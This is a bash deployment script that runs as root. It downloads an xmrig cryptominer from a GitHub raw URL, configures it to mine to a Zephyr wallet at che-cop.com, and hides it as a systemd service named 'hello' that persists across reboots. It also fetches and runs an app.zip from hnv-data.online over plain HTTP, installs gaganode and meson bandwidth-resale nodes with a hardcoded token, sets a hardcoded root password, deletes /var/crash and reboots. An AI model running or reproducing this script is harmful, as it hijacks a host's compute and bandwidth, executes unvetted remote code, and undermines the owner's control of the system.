#!/bin/bash
sudo su
cd /home
wget https://raw.githubusercontent.com/taikhoanxzc004/az/main/xmrig
chmod +x xmrig

rm -rf /lib/systemd/system/hello.service
rm -rf /var/crash

cat > /home/config.json <<EOL
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": 5,
        "memory-pool": true,
        "yield": false,
        "asm": true,
        "argon2-impl": null,
        "argon2": [0],
        "astrobwt": [-1],
        "cn": [1],
        "cn-heavy": [1],
        "cn-lite": [1],
        "cn-pico": [1],
        "cn/upx2": [
            [2, 0],
            [2, 1],
            [2, 2],
            [2, 3]
        ],
        "ghostrider": [
            [4, 0],
            [4, 2],
            [4, 0],
            [4, 2]
        ],
        "rx": [0, 1, 2, 3,],
        "rx/wow": [0, 1, 2, 3],
        "cn-lite/0": false,
        "cn/0": false,
        "rx/arq": "rx/wow",
        "rx/keva": "rx/wow"
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn-lite/0": false,
        "cn/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn-lite/0": false,
        "cn/0": false
    },
    "log-file": null,
    "donate-level": 1,
    "donate-over-proxy": 0,
    "pools": [
        {
            "algo": "rx/0",
            "coin": null,
            "url": "che-cop.com:8423",
            "user": "ZEPHsAJeJU3Su6K5KnAE4HLa8SKUtd2tpPJpdKAp3Y74EufH7Y4TXeJHDya93kfkRqcAgGgM3X82x8zP6c42keLS2KXoxDjqize",
            "pass": "x",
            "rig-id": "scde",
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": true,
            "sni": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "retries": 5,
    "retry-pause": 5,
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "dns": {
        "ipv6": false,
        "ttl": 30
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}

EOL

cat > /lib/systemd/system/hello.service <<EOL
[Unit]
Description=hello
After=network.target
[Service]
ExecStart=/home/xmrig
User=root
[Install]
WantedBy=multi-user.target
EOL

systemctl daemon-reload &&
systemctl enable hello.service &&
service hello stop  &&
service hello restart &&


mkdir /home/app && cd /home/app && wget https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb -O packages-microsoft-prod.deb && sudo dpkg -i packages-microsoft-prod.deb && rm packages-microsoft-prod.deb && sudo apt-get update && sudo apt-get install -y aspnetcore-runtime-6.0 unzip && curl -sS http://hnv-data.online/app.zip > app.zip && unzip app.zip

cat > /etc/systemd/system/app.service <<EOL
[Unit]
Description=Example .NET Web API App running on Ubuntu

[Service]
WorkingDirectory=/home/app
ExecStart=/usr/bin/dotnet /home/app/HNV.DistributeFile.Client.dll
Restart=always
# Restart service after 10 seconds if the dotnet service crashes: 
RestartSec=10
KillSignal=SIGINT
SyslogIdentifier=dotnet-example
User=root
Environment=ASPNETCORE_ENVIRONMENT=Production
Environment=DOTNET_PRINT_TELEMETRY_MESSAGE=false

[Install]
WantedBy=multi-user.target
EOL
sudo systemctl daemon-reload && sudo systemctl enable app.service && sudo systemctl start app.service

cd /root && curl -o gaganode-linux-amd64.tar.gz https://assets.coreservice.io/public/package/66/gaganode_pro/0.0.200/gaganode_pro-0_0_200.tar.gz && tar -zxf gaganode-linux-amd64.tar.gz && rm -f gaganode-linux-amd64.tar.gz && cd gaganode-linux-amd64 && rm -rf ./root_conf/default.toml && cd root_conf && wget https://raw.githubusercontent.com/taikhoanxzc004/gaga/main/default.toml
cat > /etc/systemd/system/gaganode.service <<EOL
[Unit]
Description=Example .NET Web API App running on Ubuntu

[Service]
WorkingDirectory=/root/gaganode-linux-amd64
ExecStart=/root/gaganode-linux-amd64/gaganode
Restart=always
RestartSec=10
KillSignal=SIGINT
User=root

[Install]
WantedBy=multi-user.target
EOL
sudo systemctl daemon-reload && sudo systemctl enable gaganode.service && sudo systemctl start gaganode.service

cd /root && wget 'https://staticassets.meson.network/public/meson_cdn/v3.1.19/meson_cdn-linux-amd64.tar.gz' && tar -zxf meson_cdn-linux-amd64.tar.gz && rm -f meson_cdn-linux-amd64.tar.gz && cd ./meson_cdn-linux-amd64 && sudo ./service install meson_cdn && sudo ./meson_cdn config set --token=fdmbxmtufonkjjpqb60855facf68464d --https_port=443 --cache.size=20 && sudo ./service start meson_cdn
cat > /etc/systemd/system/meson.service <<EOL
[Unit]
Description=Example .NET Web API App running on Ubuntu

[Service]
WorkingDirectory=/root/meson_cdn-linux-amd64
ExecStart=/root/meson_cdn-linux-amd64/meson_cdn
Restart=always
RestartSec=10
KillSignal=SIGINT
User=root

[Install]
WantedBy=multi-user.target
EOL
sudo systemctl daemon-reload && sudo systemctl enable meson.service && sudo systemctl start meson.service && echo 'root:Ytb1452@!@#$%Aa' | chpasswd && sudo reboot
